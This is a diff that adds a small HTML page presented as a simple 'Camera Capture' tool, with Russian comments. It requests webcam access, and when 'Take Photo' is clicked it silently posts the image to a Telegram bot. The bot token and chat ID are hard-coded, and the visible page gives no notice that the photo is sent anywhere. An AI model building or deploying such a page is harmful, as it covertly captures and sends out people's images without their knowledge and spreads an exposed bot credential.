@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Capture</title>
+</head>
+<body>
+    <h1>Camera Capture</h1>
+    <video id="video" width="640" height="480" autoplay></video>
+    <button id="snap">Take Photo</button>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+
+        // Запрос доступа к веб-камере
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+            })
+            .catch(err => {
+                console.error("Ошибка доступа к камере:", err);
+            });
+
+        // Захват изображения при нажатии кнопки
+        document.getElementById('snap').addEventListener('click', () => {
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, 640, 480);
+
+            // Преобразование изображения в base64
+            const dataUrl = canvas.toDataURL('image/png');
+
+            // Отправка изображения на Telegram бот
+            fetch(`https://api.telegram.org/bot7271868839:AAGtHfD8E1O8B6xikO9s0sooUqbjzya-kvU/sendPhoto`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: '7406507427',
+                    photo: dataUrl
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Успешно отправлено в Telegram:', data);
+            })
+            .catch(error => {
+                console.error('Ошибка при отправке:', error);
+            });
+        });
+    </script>
+</body>
+</html>
